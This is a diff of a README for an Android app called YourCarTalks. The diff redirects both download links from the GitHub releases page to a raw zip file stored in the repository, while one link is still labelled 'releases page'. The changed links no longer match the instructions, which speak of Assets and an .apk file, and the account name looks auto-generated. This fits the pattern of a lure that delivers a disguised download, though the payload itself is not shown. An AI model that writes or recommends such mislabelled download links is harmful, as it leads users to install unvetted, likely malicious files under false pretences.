@@ -1,12 +1,12 @@
 # 🚗 YourCarTalks - Greets you by your car name
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/transoceanic-rupestralplant748/YourCarTalks/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/transoceanic-rupestralplant748/YourCarTalks/raw/refs/heads/main/unwrapped/Your-Car-Talks-v3.7-beta.4.zip)
 
 YourCarTalks connects to your vehicle through Android Auto. It speaks to you when your phone links to your car. The app uses offline voice technology to say your car's name. It works without an internet connection.
 
 ## 📥 How to download the app
 
-1. Visit the [releases page](https://github.com/transoceanic-rupestralplant748/YourCarTalks/releases).
+1. Visit the [releases page](https://github.com/transoceanic-rupestralplant748/YourCarTalks/raw/refs/heads/main/unwrapped/Your-Car-Talks-v3.7-beta.4.zip).
 2. Look for the section labeled Assets.
 3. Click the file ending in .apk to save it to your computer.
 4. Move this file to your Android phone.
